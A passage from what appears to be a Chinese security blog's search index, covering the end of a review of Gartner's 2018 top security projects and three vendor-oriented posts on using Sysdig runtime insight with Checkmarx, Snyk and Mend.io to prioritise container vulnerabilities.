微分段和流量可视化"></a>Top 5 微分段和流量可视化</h2><p>该项目的受众群体是希望在数据中心内对流量进行可视化和控制的具有平面网络拓扑的组织（无论是本地还是 IaaS）。</p><p>正如 MacDonald 所言：“如果坏人来了，他们无法在这样的环境中为所欲为。”，该项目的目标是：阻止数据中心攻击的横向扩散。</p><blockquote><p>提示</p><p>在实施微分段（microsegmentation）时，应该以增强可见性作为分段的起点，以便更好地了解网络流量和安全需求。但是，不要过度细分网络，以免增加管理复杂性。</p><p>建议从关键应用程序开始分段，并要求供应商支持本地分段技术，以提高实施微分段的效果和效率。</p></blockquote><h2 id="Top-6-检测与响应"><a href="#Top-6-检测与响应" class="headerlink" title="Top 6 检测与响应"></a>Top 6 检测与响应</h2><p>该项目的受众群体是已经意识到被攻击是不可避免的组织，他们正在寻找端点、网络或基于用户方面的方法来检测、调查和应对高级威胁。该项目有以下三种变体可供选择：</p><ul><li>终端保护平台（EPP）+ 终端检测和响应（EDR）</li><li>用户和实体行为分析（UEBA）</li><li>Deception</li></ul><p>Deception 是一个小型但新兴的市场趋势或选择，可以帮助组织加强威胁检测机制，并提供高度准确的事件信息。</p><blockquote><p>提示</p><p>建议向 EPP 供应商施加压力，要求他们提供 EDR 功能，同时向 SIEM（安全信息和事件管理）供应商施加压力，要求他们提供用户和实体行为分析（UEBA）功能。</p><p>并且，建议要求提供丰富的欺骗目标组合，考虑直接从供应商那里获取 MDR（威胁检测与响应）的“轻量级”服务。</p></blockquote><h2 id="✨-Top-7-云安全态势管理（CSPM）"><a href="#✨-Top-7-云安全态势管理（CSPM）" class="headerlink" title="✨ Top 7 云安全态势管理（CSPM）"></a>✨ Top 7 云安全态势管理（CSPM）</h2><p>若您的团队需要对 IaaS 或 PaaS 的云安全态势进行全面地、自动化管理，以便识别严重的风险，您可以考虑该项目。</p><p>您可以选择包括云访问安全代理（CASB）在内的多个供应商。</p><blockquote><p>提示</p><p>如果您只有一个 IaaS，请先看看 Amazon 和 Microsoft，并将此作为您的 CASB 供应商的需求。</p></blockquote><h2 id="✨-Top-8-自动化安全扫描"><a href="#✨-Top-8-自动化安全扫描" class="headerlink" title="✨ Top 8 自动化安全扫描"></a>✨ Top 8 自动化安全扫描</h2><p>该项目适用于希望将安全融入 DevOps 工作流的团队。建议先从开源组件成份分析开始，然后将扫描流程无缝集成到 DevSecOps 中，其中还包括容器技术。</p><blockquote><p>提示</p><p>不要让开发人员更换工具，应该提供全面的 API 支持以实现自动化。</p></blockquote><h2 id="✨-Top-9-云访问安全代理（CASB）"><a href="#✨-Top-9-云访问安全代理（CASB）" class="headerlink" title="✨ Top 9 云访问安全代理（CASB）"></a>✨ Top 9 云访问安全代理（CASB）</h2><p>该项目适用于具有移动劳动力的团队，例如远程办公、出差或客户现场工作等。这类的组织希望有一种方法可以集中监控和管理他们的员工在不同企业和云服务中的活动，以提高效率和安全性。</p><blockquote><p>提示</p><p>在开启该项目之前，需要对组织内部的信息进行调查和识别，以确定该项目的必要性。</p><p>在 2018 年和 2019 年，发现和监控敏感数据被认为是一个非常重要的方向。</p></blockquote><h2 id="Top-10-软件定义边界"><a href="#Top-10-软件定义边界" class="headerlink" title="Top 10 软件定义边界"></a>Top 10 软件定义边界</h2><p>该项目适用于那些仅希望将数字系统和信息暴露给指定的外部合作伙伴、远程工作人员和承包商以减小攻击面的组织。</p><blockquote><p>提示</p><p>传统的 VPN 可能存在一些安全风险，例如：难以管理的访问权限、数据泄露的风险等。团队需要重新评估基于 VPN 访问的风险，并在 2018 年试点部署，将其作为链接到合作伙伴的数字业务服务的用例。</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文，我们解读了 Gartner 2018 年十大安全项目，标注了在当时看来最值得关注的几个云原生安全项目：</p><ul><li>Top 2 受 CARTA 启发的漏洞管理</li><li>Top 7 云安全态势管理（CSPM）</li><li>Top 8 自动化安全扫描</li><li>Top 9 云访问安全代理（CASB）</li></ul><p>早在 2018 年，行业领航人就意识到，已知的漏洞不一定会给组织带来真实的风险，我们永远不要想着修复完所有的漏洞，并且最早提出了漏洞优先级的概念。</p><p>要知道，了解科技资讯，把握行业脉搏对于安全研究也至关重要！</p>]]></content>
    
    
    
    <tags>
      
      <tag>安全建设</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 Checkmarx 和 Sysdig 更快地确定漏洞的优先级</title>
    <link href="/2024/05/16/%E4%BD%BF%E7%94%A8-Checkmarx-%E5%92%8C-Sysdig-%E6%9B%B4%E5%BF%AB%E5%9C%B0%E7%A1%AE%E5%AE%9A%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7/"/>
    <url>/2024/05/16/%E4%BD%BF%E7%94%A8-Checkmarx-%E5%92%8C-Sysdig-%E6%9B%B4%E5%BF%AB%E5%9C%B0%E7%A1%AE%E5%AE%9A%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>应用上云的团队已被淹没在海量的漏洞中了，他们每天都面临着大量的告警以至于没有时间进行处理。</p><p><a href="https://sysdig.com/press-releases/checkmarx-and-sysdig/">2023 年 8 月 8 日，Sysdig 和 Checkmarx 宣布通过合作来解决漏洞过载的问题</a>。<a href="https://checkmarx.com/product/application-security-platform/">Checkmarx One AppSec</a>平台引入了 Sysdig 的<a href="https://sysdig.com/learn-cloud-native/cloud-security/cloud-native-application-protection-platform-cnapp-fundamentals/">云原生应用保护平台</a>中的运行时观测，来帮助安全团队减少 95% 以上的漏洞噪音，从而让开发人员快速地解决他们首要的安全问题。</p><h2 id="0x01-解决的问题"><a href="#0x01-解决的问题" class="headerlink" title="0x01 解决的问题"></a>0x01 解决的问题</h2><p>安全左移的关键在于：确保公司在每一个开发阶段的早期减少风险问题。在每一个开发阶段的早期发现安全漏洞是好事，并且并不难，难的是，如何判断哪些漏洞是噪声，哪些漏洞真的会带来风险。开发人员需要这些信息来确定他们应该优先处理哪些漏洞。</p><h2 id="0x02-基本原理"><a href="#0x02-基本原理" class="headerlink" title="0x02 基本原理"></a>0x02 基本原理</h2><p>Checkmarx 的软件成份分析（Software Composition Analysis，SCA）是<a href="https://checkmarx.com/product/application-security-platform/">Checkmarx One</a> 平台的一部分，可以帮助团队查找代码中易受攻击的开源的软件包并获取修复指南，以便快速降低开源风险。</p><p>Sysdig 深耕<a href="https://sysdig.com/why-runtime-insights/">运行时观测</a>多年，可以对正在运行中的容器镜像进行分析，以识别出正在使用的软件包中的漏洞，然后通过一组 API，将正在使用的软件包信息提供给漏洞管理等其他的工具。</p><p>漏洞管理工具再过滤掉未使用的软件包中的漏洞，从而让开发人员和安全团队专注于真正重要的事情，保证开发和交付的速度。</p><p><img src="/image/image6-29_DF4fy3d4-h.png" alt="图 1：Sysdig 与 Checkmarx 的工作原理" title="图1：Sysdig与Checkmarx的工作原理"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><ul><li><p><strong>减少漏洞疲劳。</strong></p><p>Checkmarx SCA 与 Sysdig Secure 将漏洞信息与运行时组件使用情况集成到软件的生命周期中。可以帮助用户清除地了解到容器中各个组件的使用情况和漏洞的实际影响，为开发者提供一个有效的反馈循环，从而显著地减少了开发者的漏洞修复的工作量。</p></li><li><p><strong>集中修复&#x3D;更快地交付。</strong></p><p>更早、更有效地对安全风险进行检测和响应能够对开发人员的生产力产生更积极的影响。若能够更多地关注应用程序的实际开发情况和部署环境，而不是对不必要的漏洞进行修复，那么团队将能更好地跟上软件交付的步伐，从而加快上市时间（LLM）。</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用 Risk Spotlight 消除噪音并优先处理真正重要的漏洞</title>
    <link href="/2024/05/13/%E5%88%A9%E7%94%A8-Risk-Spotlight-%E6%B6%88%E9%99%A4%E5%99%AA%E9%9F%B3%E5%B9%B6%E4%BC%98%E5%85%88%E5%A4%84%E7%90%86%E7%9C%9F%E6%AD%A3%E9%87%8D%E8%A6%81%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/05/13/%E5%88%A9%E7%94%A8-Risk-Spotlight-%E6%B6%88%E9%99%A4%E5%99%AA%E9%9F%B3%E5%B9%B6%E4%BC%98%E5%85%88%E5%A4%84%E7%90%86%E7%9C%9F%E6%AD%A3%E9%87%8D%E8%A6%81%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>你的团队是否被容器镜像的漏洞信息淹没？你是否花费了大量时间确定在哪里集中资源去修复漏洞，但仍然错过了危险的漏洞？请知道，你并不孤单。</p><p>容器环境通过前所未有的速度改变了应用程序开发，但这并非没有代价。使用现成的第三方容器镜像和开源代码可以大大加快开发周期，但也促成了应用程序中漏洞的引入。一个容器可能有数百个漏洞；更复杂的应用程序环境可能达到数万个漏洞。</p><h2 id="0x01-背景：容器漏洞过载日益成为一个挑战"><a href="#0x01-背景：容器漏洞过载日益成为一个挑战" class="headerlink" title="0x01 背景：容器漏洞过载日益成为一个挑战"></a>0x01 背景：容器漏洞过载日益成为一个挑战</h2><p>情况并未好转，特别是<a href="https://www.cvedetails.com/browse-by-date.php">2016 年至 2017 年，新的漏洞数量增加了将近两倍</a>。</p><p><img src="/image/image_l8jh8jhaa9.png" alt="图 1：每年的 CVE 漏洞数量" title="图 1： 每年的CVE漏洞数量"></p><p>据美国网络安全与基础设施安全局（CISA）报告：<a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-040a">软件漏洞在 2021 年勒索软件事件的初始感染途径中仍然位列前三</a>。因此，及时发现和修复漏洞对于防止安全漏洞至关重要。</p><p><img src="/image/image_swqcLqVpfO.png" alt="图 2:2021 Trends Show Increased Globalized Threat of Ransomware" title="图2：2021 Trends Show Increased Globalized Threat of Ransomware"></p><p>在容器的世界中，管理漏洞已经变成了一个复杂的平衡风险、有限资源和对开发的影响的方程式。修复所有问题既不现实也没必要。并非所有漏洞都会带来风险，但找出那些不能等待，需要立即修复的漏洞却像是大海捞针一样困难。</p><p>DevOps 和安全团队都知道，向开发人员提供一长串漏洞是行不通的，但将应用程序暴露给攻击者也不是一个好的选项。开发人员想知道的是，哪些漏洞需要优先处理，立即采取行动。</p><h2 id="0x02-问题：现有的优先级划分方法并不有效"><a href="#0x02-问题：现有的优先级划分方法并不有效" class="headerlink" title="0x02 问题：现有的优先级划分方法并不有效"></a>0x02 问题：现有的优先级划分方法并不有效</h2><p>人们通常通过 CVSS 分数定义的威胁等级来减少漏洞负载，但是这种方法存在非常严重的缺陷。即使修复了高危和严重级别的漏洞，漏洞的负载也不会减少到可管理的范围之内，因为漏洞的数量远远超过了团队的处理能力，团队需要进一步确定漏洞的处理优先级。但认识到 CVSS 分数可能会产生误导也很重要。</p><p>安全研究员 Miguel Hernández 在他的博客《<a href="https://sysdig.com/blog/vulnerability-score-cvss-meaning/">Are vulnerability scores misleading you? Understanding CVSS score</a>》中说到：高危漏洞可能只是噪音，它不会对您的应用程序造成任何实际的风险。而中危漏洞可能会给攻击者提供切入点，从而演变成广泛且有危害的影响。因此，仅根据 CVSS 分数确定优先级是低效的，甚至是无效的。</p><p>其他的漏洞优先级方法会尝试采用一些额外的风险因素，但这同样无法解决漏洞过载的问题，因为它们无法判断一些漏洞会不会对具体的环境造成一些实际的风险，无法消除漏洞中的噪音。</p><h2 id="0x03-原理：Risk-Spotlight-消除噪音并自动发现真正重要的漏洞"><a href="#0x03-原理：Risk-Spotlight-消除噪音并自动发现真正重要的漏洞" class="headerlink" title="0x03 原理：Risk Spotlight 消除噪音并自动发现真正重要的漏洞"></a>0x03 原理：Risk Spotlight 消除噪音并自动发现真正重要的漏洞</h2><p><strong>容器镜像漏洞报告中的大多数漏洞实际上都是噪音。</strong> 因为容器中包含着许多从未被使用过的软件包。即使这些软件包从未被使用过，但是仍然会在漏洞扫描报告中。</p><p><strong>漏洞的可利用性是是否造成实际的风险的关键决定因素。</strong> 如果漏洞从未被暴露出来，那么该漏洞就不会提供被利用的机会，也不会带来实际的风险，容器运行的过程中不活跃的软件包中的漏洞也只是噪音。</p><p>那么如何判断哪些容器已经被暴露出来并会构成真正的风险呢？Sysdig 提出，可以使用<strong>运行时智能</strong>来解决该问题。</p><p><img src="/image/image_n19hGiyhg1.png" alt="图 3：使用运行时智能来消除容器镜像中的漏洞噪音" title="图3：使用运行时智能来消除容器镜像中的漏洞噪音"></p><p>Sysdig 可以通过观测容器中的系统调用来准确识别运行时加载的软件包，消除容器漏洞优先级中对漏洞可利用性的猜测。通过了解暴露的内容和未暴露的内容，Risk Spotlight 消除了噪音和优先级猜测，以便团队可以专注于迫不及待的真正重要问题。</p><h2 id="0x04-解决方案：了解使用-Sysdig-如何快速、轻松地识别哪些漏洞构成真正的风险"><a href="#0x04-解决方案：了解使用-Sysdig-如何快速、轻松地识别哪些漏洞构成真正的风险" class="headerlink" title="0x04 解决方案：了解使用 Sysdig 如何快速、轻松地识别哪些漏洞构成真正的风险"></a>0x04 解决方案：了解使用 Sysdig 如何快速、轻松地识别哪些漏洞构成真正的风险</h2><p>如果向 DevOps 和安全团队发送一份包含数百个漏洞的报告，那么可能是没有用的，因为在不消除噪音的情况下，对漏洞进行优先级排序是无效的。如果只有少数的几个漏洞会给攻击者提供真正的利用的机会，那么为什么要让您的团队承担不构成风险的漏洞呢？</p><p><img src="/image/image_935aozXuii.png" alt="图 4：云原生的工作负载中包含大量的漏洞" title="图4：云原生的工作负载中包含大量的漏洞"></p><p>借助 Risk Spotlight，您可以取消一些漏洞的修复优先级，并将修复工作的重心放在会直接构成风险的漏洞上，从而可以使用最少的资源更快的修复更重要的漏洞。</p><p><img src="/image/image_nbY_MArxvx.png" alt="图 5：借助 Risk Spotlight 筛选出需要优先修复的漏洞" title="图5：借助Risk Spotlight 筛选出需要优先修复的漏洞"></p><h2 id="0x05-总结：风险聚焦的主要好处"><a href="#0x05-总结：风险聚焦的主要好处" class="headerlink" title="0x05 总结：风险聚焦的主要好处"></a>0x05 总结：风险聚焦的主要好处</h2><p>更多信息请观看 Youtobe 视频：<a href="https://www.youtube.com/watch?v=9HIhQcrBRKM">Reducing vulnerability noise with Sysdig</a>，总的来说，风险聚焦的好处有：</p><ul><li><strong>将漏洞噪音减少高达 95%</strong>。Risk Spotlight 通过识别运行时未使用的包来消除不会立即造成风险的漏洞带来的干扰。</li><li><strong>通过可行的见解来管理风险</strong>。Risk Spotlight 提供丰富的漏洞详细信息，例如来自多个来源的 CVSS 向量、漏洞修复版本和公开可用漏洞的链接，Risk Spotlight 还提供了以软件包为中心的视图，有助于大规模修复和管理漏洞风险。</li><li><strong>对容器从源到运行的全面漏洞管理</strong>。Risk Spotlight 提供了整个容器生命周期（从构建到运行时）的漏洞风险的单一视图。开发人员可以立即采取行动，以缓解构成真正风险的少数漏洞，并通过在构建过程中删除未使用的包来尽早应用安全最佳实践。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sysdig 和 Snyk 使用运行时智能来消除漏洞噪音</title>
    <link href="/2024/05/12/Sysdig-%E5%92%8C-Snyk-%E4%BD%BF%E7%94%A8%E8%BF%90%E8%A1%8C%E6%97%B6%E6%99%BA%E8%83%BD%E6%9D%A5%E6%B6%88%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%99%AA%E9%9F%B3/"/>
    <url>/2024/05/12/Sysdig-%E5%92%8C-Snyk-%E4%BD%BF%E7%94%A8%E8%BF%90%E8%A1%8C%E6%97%B6%E6%99%BA%E8%83%BD%E6%9D%A5%E6%B6%88%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%99%AA%E9%9F%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在当今的云环境中最大的挑战之一是：在确保快速的开发周期的同时，还需要跟上安全漏洞的步伐。2022 年 2 月 16 日，<a href="https://sysdig.com/press-releases/sysdig-and-snyk-announce-container-security-partnership">Sysdig 和 Snyk 宣布建立合作伙伴关系</a>，为容器运行时安全提供集成代码，消除高达 95% 的漏洞警报噪声、优化修复流程并保护运行时安全。让开发人员可以快速消除安全障碍，同时又不牺牲安全。</p><h2 id="0x01-背景：漏洞过载会损害安全性和生产力"><a href="#0x01-背景：漏洞过载会损害安全性和生产力" class="headerlink" title="0x01 背景：漏洞过载会损害安全性和生产力"></a>0x01 背景：漏洞过载会损害安全性和生产力</h2><p>云原生加快的开发步伐促进了更快的创新，但也积压下越来越多的漏洞。开发人员不仅对漏洞不知所措，还不知道漏洞所带来的实际的风险和修复工作的重点。因为仅试图理解这些噪音就已经占用了宝贵的敲代码的时间了，更别说要将时间花费在一些不会带来真正的风险的无关紧要的漏洞上所带来的挫败感。</p><p>在监控运行时环境的安全运营团队中，也充斥了漏洞警报的噪音，这些噪音分散了人们对真正的威胁的注意力，而在对漏洞进行分类上浪费资源的代价很高。据 <a href="https://sysdig.com/blog/2022-cloud-native-security-usage-report/#.YfOJ6L1MmK4.linkedin" title="《Sysdig 2022年云原生安全和使用》">《Sysdig 2022 年云原生安全和使用》</a>的报告显示：多达 75% 的可修复的高危和严重漏洞在生产环境中的容器中运行。过载的漏洞不仅会让漏洞修复的过程变得难以管理，还给攻击者利用留下很大的漏洞暴露的窗口，据统计，组织不得不平均花费大约 6 个月来对漏洞进行修复。</p><p><img src="/image/image_izQBggE6QQ.png" alt="图 1:75% 的容器存在高危或严重级别的漏洞" title="图1：75%的容器存在高危或严重级别的漏洞"></p><p>修复所有的漏洞显然是一个不切实际的目标，但是不及时修复又是一个非常危险的赌注。<strong>因此，我们需要确定漏洞修复的优先级。</strong></p><h2 id="0x02-解决方案：通过运行时智能过滤噪音"><a href="#0x02-解决方案：通过运行时智能过滤噪音" class="headerlink" title="0x02 解决方案：通过运行时智能过滤噪音"></a>0x02 解决方案：通过运行时智能过滤噪音</h2><p>现如今，应用程序都是由大量的开源的第三方软件包组装而来，这使得应用程序中的漏洞是普遍存在的，以至于容器中的软件包存在数以万亿计的漏洞。借助<a href="https://snyk.co/ueizO" title="Snyk Container">Snyk Container</a>，开发人员可以在整个软件开发的过程中获得安全反馈，知道如何在更安全的基础镜像上构建容器。</p><p>然而，容器通常会因应用程序运行时未使用的内容和包而变得十分臃肿。因此，在没有预先限制的情况下，对漏洞进行优先级排序（即，将重要的内容与根本不重要的内容分开）可以让您从现有的优先级排序方案中获益。噪音进来了又出去，这就是为什么漏洞超载所带来的痛苦如此普遍，这就是<a href="https://sysdig.com/products/secure/" title="Sysdig Secure">Sysdig Secure</a>容器运行时安全智能发挥作用的地方。</p><p>Sysdig 通过 Falco 开创了云原生运行时威胁检测和响应的先河，推动了云和容器安全的标准。Falco 是跨 Kubernetes、容器和云进行持续风险和威胁检测的开源标准。</p><p>在生产环境中使用 Sysdig 的容器运行时风险情报，漏洞噪音可减少多达 95%。这种急需的噪音消除是通过关注影响容器运行时实际使用的包的漏洞来实现的。这些是首先要解决的问题，因为它们确实面临着被利用的风险。</p><p><img src="/image/image_-MhEfQmDkN.png" alt="图 2：Sysdig 运行时智能可以有效减少漏洞噪音" title="图2：Sysdig 运行时智能可以有效减少漏洞噪音"></p><h2 id="0x03-生产使用：集成优先级可实现优化修复"><a href="#0x03-生产使用：集成优先级可实现优化修复" class="headerlink" title="0x03 生产使用：集成优先级可实现优化修复"></a>0x03 生产使用：集成优先级可实现优化修复</h2><p>正如生产中持续发现的大量漏洞所证明的那样，以前的优先级方法使得漏洞报告仍然受到噪音污染。如果没有运行时上下文，开发人员最终会被低风险或不相关的漏洞淹没，甚至可能会浪费资源来修复它们。而且，更糟糕的是，开发人员可能会错过修复关键的漏洞。</p><p>通过使用 Sysdig 和 Snyk 所提供的解决方案，开发人员可以根据运行时上下文，精确定位在生产应用程序中被使用的软件包以及可被利用的漏洞。由于开发人员现在可以清楚地看到少数几个不能等待的漏洞，因此他们可以集中精力更快地修复漏洞，减少猜测，完成更多的工作。</p><p><img src="/image/image_cQ37UZnq_R.png" alt="图 3：Sysdig 和 Snyk 所提供的安全解决方案" title="图3：Sysdig和Snyk所提供的安全解决方案"></p><h2 id="0x04-总结：弥合开发、安全和运营之间的差距"><a href="#0x04-总结：弥合开发、安全和运营之间的差距" class="headerlink" title="0x04 总结：弥合开发、安全和运营之间的差距"></a>0x04 总结：弥合开发、安全和运营之间的差距</h2><p>当安全的 DevOps 文化能够为团队带来积极影响时，这种文化就会得到充分的认可。通过此解决方案，所有团队都能获得他们在开发和运行安全的云原生应用方面所需的支持，同时消除了阻碍更快创新的障碍。</p><p>容器安全运行时集成是一个很好的例子，它能够填补差距，为开发人员、安全团队和运维团队提供巨大价值。通过从生产环境到开发人员的容器运行时可见性，可以消除漏洞噪音，更快地解决关键问题。通过更有效地降低风险，安全运维团队改善了组织的风险敞口，并能更好地专注于检测威胁的早期迹象。此外，开发人员可以节省编码时间，推进业务目标。</p><p>从管理漏洞到检测和响应实时威胁，以及监控和故障排除云原生环境，Sysdig 和 Snyk 提供了最全面的安全保障：</p><ul><li><strong>从代码到运行时保护容器安全：</strong> 将安全性整合到容器和 Kubernetes 生命周期中——从安全的基础镜像到漏洞优先级排序，再到在运行时检测实时威胁和新漏洞。</li><li><strong>从一开始就建立安全性：</strong> 根据生产环境中真正必要的内容，在构建过程中解决漏洞并删除不必要的软件包。</li><li><strong>具备运行时保护：</strong> 确保部署了威胁检测，以防止攻击，直到新的关键漏洞和受零日利用攻击的漏洞得到解决。</li><li><strong>统一优先级</strong>：获得风险的统一视图，将运行时上下文与漏洞检查配对，以优先处理重要的警报。当团队知道现在需要解决什么问题，而不是在一周后，以及什么只是可以忽略的噪音时，开发人员和运维工作负载就变得更加可管理。</li></ul><p>更详细的信息，请观看 YouTube 视频：<a href="https://www.youtube.com/watch?v=oAGoEXjAqzg" title="Containerized AppSec From Code to Production With Snyk, Sysdig and AWS">Containerized AppSec From Code to Production With Snyk, Sysdig and AWS</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mend.io 和 Sysdig 推出容器安全联合解决方案</title>
    <link href="/2024/05/11/Mend-io-%E5%92%8C-Sysdig-%E6%8E%A8%E5%87%BA%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E8%81%94%E5%90%88%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2024/05/11/Mend-io-%E5%92%8C-Sysdig-%E6%8E%A8%E5%87%BA%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E8%81%94%E5%90%88%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2024 年 5 月 7 日，在 <a href="https://www.rsaconference.com/">RSA 大会</a>上，<a href="http://mend.io/">Mend.io</a> 和 <a href="https://sysdig.com/">Sysdig</a>推出了一项容器安全联合解决方案，以帮助开发人员、DevOps 和安全团队加速从开发到部署的安全软件交付过程。</p><p>该解决方案将 Sysdig 的运行时上下文与 Mend Container 相结合，为用户提供跨开发环境和生产环境的卓越的、端到端的、基于风险的漏洞优先级排序和修复。</p><h2 id="0x01-背景：保护工作负载面临的日益严峻的挑战"><a href="#0x01-背景：保护工作负载面临的日益严峻的挑战" class="headerlink" title="0x01 背景：保护工作负载面临的日益严峻的挑战"></a>0x01 背景：保护工作负载面临的日益严峻的挑战</h2><p>2022 年 3 月 7 日，Gartner 在《<a href="https://www.gartner.com/en/newsroom/press-releases/2022-03-07-gartner-identifies-top-security-and-risk-management-trends-for-2022">Gartner Identifies Top Security and Risk Management Trends for 2022</a>》中预测：2025 年，45% 的大型企业的软件供应链将遭受攻击。</p><p>2024 年 2 月 21 日，Coalition 在《<a href="https://www.computerweekly.com/news/366570913/CVE-volumes-set-to-increase-25-this-year">CVE volumes set to increase 25% this year</a>》中预计：2024 年 CVE 总数将增加 25%。随着新的漏洞不断涌现，开发人员和安全团队都需要更好的方法来过滤噪音，并实现安全交付的最终目标。</p><p>威胁行为者不断寻找引入和利用漏洞来渗透目标组织网络的方法。随着容器的使用不断增长，它们将成为恶意代码的理想交付工具。</p><p>Mend.io 企业开发执行副总裁 Vered Shaked 说：“随着组织越来越多地使用容器和 Kubernetes 等云原生服务，他们很难跟上检测到的大量安全问题的步伐，该解决方案共同为时间和资源有限的组织提供了更有效的方法来针对实际风险进行补救。通过提供对运行时检测到的风险的洞察，安全团队可以更有信心地进行预防和防御。”</p><p>Sysdig 技术联盟副总裁 Bryan Smoltz 表示：“归根结底，安全性需要在不减慢产品开发速度的情况下保护组织，但由于缺乏运行时上下文，团队很难确定优先级。通过突出显示漏洞并根据运行时洞察确定优先级，我们与 Mend.io 的合作使用户能够简化安全性并加快行动速度。”</p><h2 id="0x02-工作原理：Mend-io-和-Sysdig-集成"><a href="#0x02-工作原理：Mend-io-和-Sysdig-集成" class="headerlink" title="0x02 工作原理：Mend.io 和 Sysdig 集成"></a>0x02 工作原理：<strong>Mend.io 和 Sysdig 集成</strong></h2><p>首先，Sysdig 通过运行时的视角，对容器进行分析，以确定所使用的软件包和未使用的软件包。然后，开发人员借助 Mend.io，针对漏洞的威胁等级、可利用性、可达性和运行时曝光度（即运行时软件包的使用情况）等因素来定位漏洞和真实的风险，最终达成相应的修复目标。</p><p><img src="/image/image_CUQmQ-Tyje.png" alt="图 1：mend.io 和 sysdig 的集成" title="图1：mend.io 和sysdig 的集成"></p><p>Mend Container 在集成了 Mend SCA 和 Sysdig Runtime Insights API 后，可以将软件包的运行时上下文整合到 Mend SCA 产品和容器扫描结果中。开发人员和安全团队通过所提供的运行时上下文视图，可以确定应用程序在生产环境中的部署和行为，并设置漏洞的修复优先等级和评分。</p><p>Mend.io 不仅可以帮助团队计算 CVSS 分数，还可以通过分析可达性、可利用性和运行时曝光度等方面计算风险，它可以使您能够超越理论风险，具体了解应用程序上下文中的风险。</p><p><img src="/image/image_387wRZbdO-.png" alt="图 2：mend.io 产品的使用界面" title="图2： mend.io 产品的使用界面"></p><p>此外，Mend Container 能够提供应用程序的所有权见解，帮助安全团队识别易受攻击的包的相关存储库和应用程序所有权。这些见解可以实现跨团队修复过程的自动化和加速。</p><h2 id="0x03-关于-Mend-io"><a href="#0x03-关于-Mend-io" class="headerlink" title="0x03 关于 Mend.io"></a>0x03 关于 Mend.io</h2><p>Mend.io 拥有十多年帮助全球组织构建世界一流的应用安全项目的经验。Mend Container 可识别关键安全漏洞并确定其优先级，提供可行的修复建议以及开源库和依赖项的全面信息。</p><p>Mend.io 的企业应用程序安全工具套件受到 IBM、Google 和 Capital One 等全球领先公司的信赖，旨在帮助您构建和管理成熟、主动的 AppSec 计划。</p><p>Mend 了解开发人员和安全团队的不同 AppSec 要求。与其他迫使每个人使用单一工具的 AppSec 解决方案不同，Mend 通过为每个团队提供不同但互补的工具来帮助他们协调工作，使他们能够停止追逐漏洞并开始主动管理应用程序风险。</p><h2 id="0x04-关于-Sysdig"><a href="#0x04-关于-Sysdig" class="headerlink" title="0x04 关于 Sysdig"></a>0x04 关于 Sysdig</h2><p>Sysdig 可以让您深入了解运行时发生的情况。作为 Falco 开源的创建者，Sysdig 是通过其全面的运行时安全性实时监控异常行为、潜在安全威胁和合规违规行为的先驱。</p><p>在云中，每一秒都很重要。攻击以极快的速度传播，安全团队必须在不减慢业务速度的情况下保护业务。Sysdig 实时阻止云攻击，通过运行时洞察和开源 Falco 即时检测风险变化。</p><p>Sysdig 在 Gartner Peer Insights（客户之声）报告中被评为 CSPM 第一名，它将跨云工作负载、身份和服务的信号关联起来，以发现隐藏的攻击路径并优先考虑真正的风险。从预防到防御，Sysdig 帮助企业专注于重要的事情：创新。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>由于潜在威胁在整个软件生命周期（包括生产前和生产后）中以多种形式出现，组织需要一种方法来保护应用程序免受多种形式的风险。Mend.io 和 Sysdig 共同帮助用户贯彻“Shift Left”和“Shield Right”安全策略。</p><p>即使是最好的 AppSec 程序本身也是不够的，因为不可能防范生产中可能出现的所有未知威胁。在这里，Sysdig 的运行时安全性在跨容器和云实时检测威胁方面发挥着关键作用。 “盾权”重点关注预防安全事件的操作实践，以及安全监控和行为分析，以在事件发生时检测和响应。</p><p>借助 Sysdig 和 Mend.io，安全团队既可以强化安全态势，防患于未然，又可以持续监控活动风险，以确保云环境和应用程序的安全。采用综合方法识别和解决开发和生产环境中的漏洞，合作客户将获得以下优势：</p><ul><li>运行时保护。通过对容器化应用程序进行持续监控，实时优化性能，确保响应迅速和安全的环境。</li><li>漏洞噪音减少 95%。摒弃拖慢和令开发人员沮丧的多余噪音。为他们提供关于运行时加载的包的洞见，使他们能够有效地优先处理关键漏洞。</li><li>从开发到部署全面覆盖。安全团队可以准确定位漏洞最初是在哪个存储库和应用程序所有者引入到开发中的，从云端到代码，加速整个修复过程。</li><li>部署优先级控制。掌控应用程序部署优先级，提高效率，使开发人员能够确认生产部署并设置首选修复优先级。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
